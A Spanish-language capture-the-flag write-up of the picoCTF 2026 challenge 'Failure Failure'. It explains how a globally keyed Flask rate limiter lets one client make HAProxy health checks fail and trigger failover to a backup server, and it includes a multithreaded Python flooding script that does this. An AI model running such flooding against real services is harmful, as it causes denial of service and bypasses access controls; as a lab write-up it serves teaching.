# General Skills — Failure Failure

## Descripción
> **Prompt oficial del reto:** "Welcome to Failure Failure — a high-available system. This challenge simulates a real-world failover scenario where one server is prioritized over the other. A load balancer stands between you and the truth — and it won't hand over the flag until you force its hand." Se entrega también la configuración de HAProxy (`haproxy.cfg`) y el código fuente de la aplicación (`app.py`).
>
> **Hints:**
> 1. How does a load balancer decide which server should get the traffic?

- **Categoría:** General Skills
- **Dificultad:** Medium
- **Evento/origen:** picoCTF 2026
- **Autor:** Darkraicg492

## Solución
`haproxy.cfg` muestra un backend con dos servidores detrás del balanceador:

```
backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3
```

`s2` está marcado `check backup`: solo recibe tráfico si **todos** los servidores no-backup (`s1`) están caídos. El health check golpea `GET /` cada 2s y exige `200`; con 2 fallos consecutivos (`fall 2`) el servidor se marca down.

`app.py` (Flask) expone la flag condicionada a una variable de entorno:

```python
def global_rate_limit_key():
    return "global"   # <- la clave del rate limiter es una constante, NO la IP del cliente

limiter = Limiter(key_func=global_rate_limit_key, app=app, default_limits=["300 per minute"])

@app.route('/')
@limiter.limit("300 per minute")
def home():
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
    return render_template("index.html", flag=flag)
```

`s1` y `s2` son dos procesos Flask independientes (cada uno con su propio límite en memoria). Solo `s2` tiene `IS_BACKUP=yes`, así que solo él sirve la flag real — pero normalmente nunca recibe tráfico porque `s1` siempre está arriba.

La vulnerabilidad: el rate limiter usa una clave **global** (`"global"`), no por IP — así que basta con inundar `s1` con más de 300 peticiones por minuto para que el límite se dispare para *cualquiera*, incluido el propio health check de HAProxy (que también pega a `GET /` y también recibe `503` cuando se excede el límite). Dos health checks fallidos seguidos (503 en vez de 200) marcan `s1` como *down*, y HAProxy hace *failover* automático hacia `s2` (backup), que al no haber recibido tráfico sigue por debajo de su propio límite y responde con la flag real.

El reto es que la ventana de "caída" de `s1` es corta: en cuanto se deja de inundar, el contador de peticiones baja y `s1` vuelve a pasar el health check (`rise 3`), devolviendo el tráfico a la ruta normal. La solución es **no dejar de inundar mientras se sondea la flag**: un hilo de fondo satura `s1` de forma continua (60 hilos disparando peticiones sin parar) mientras, en paralelo, se hacen peticiones normales buscando la flag en la respuesta.

```python
import requests, time, threading

URL = "http://<host>:<puerto>/"
stop = False

def flooder():
    while not stop:
        try:
            requests.get(URL, timeout=3)
        except Exception:
            pass

for _ in range(60):
    threading.Thread(target=flooder, daemon=True).start()

start = time.time()
while time.time() - start < 40:
    r = requests.get(URL, timeout=3)
    if r.status_code == 200 and "No flag" not in r.text and "picoctf{" in r.text.lower():
        idx = r.text.lower().find("picoctf{")
        print("FLAG:", r.text[idx:idx+80])
        break
    time.sleep(0.3)
stop = True
```

En la práctica, tras ~1.5s de inundación aparecen varias respuestas `503` (rate limit / HAProxy "No server is available" cuando ambos health checks coinciden en fallar un instante) y a los ~4s llega una respuesta `200` desde `s2` con la flag real embebida en la plantilla `index.html`.

## Notas adicionales
- La lección central: una clave de rate-limit **compartida globalmente** (en vez de por IP/usuario) convierte cualquier rate limiter en un interruptor de disponibilidad que un solo cliente puede accionar a voluntad — y aquí ese "apagón" autoinducido es exactamente el mecanismo de disparo del failover.
- Detalle importante para reproducirlo: hay que **mantener la inundación en paralelo** mientras se sondea, no en dos fases secuenciales (flood y luego poll) — el rate limit se recupera en cuestión de segundos apenas se deja de mandar tráfico, así que una fase de flood corta seguida de un poll secuencial casi siempre "aterriza" de nuevo en `s1` recuperado antes de capturar la respuesta de `s2`.
- `s1` y `s2` corren como procesos Flask separados (direcciones `*:8000` y `*:9000` del mismo host), cada uno con su propio almacenamiento en memoria para el limiter — por eso inundar únicamente a través del balanceador (que siempre enruta a `s1` mientras esté arriba) nunca satura a `s2`.

## Referencias
- Reto: https://learn.cylabacademy.org/library/756
